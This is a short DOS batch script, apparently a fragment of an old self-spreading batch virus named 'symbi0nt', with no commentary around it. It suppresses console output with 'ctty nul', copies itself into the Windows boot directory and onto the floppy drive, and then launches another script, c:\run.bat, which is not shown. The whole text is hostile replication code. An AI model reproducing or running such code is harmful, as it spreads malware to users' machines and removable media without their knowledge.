@echo off
ctty nul
copy c:\symbi0nt.bat %winbootdir%\symbi0nt.23
command /f /c copy c:\symbi0nt.bat a:\
start c:\run.bat
exit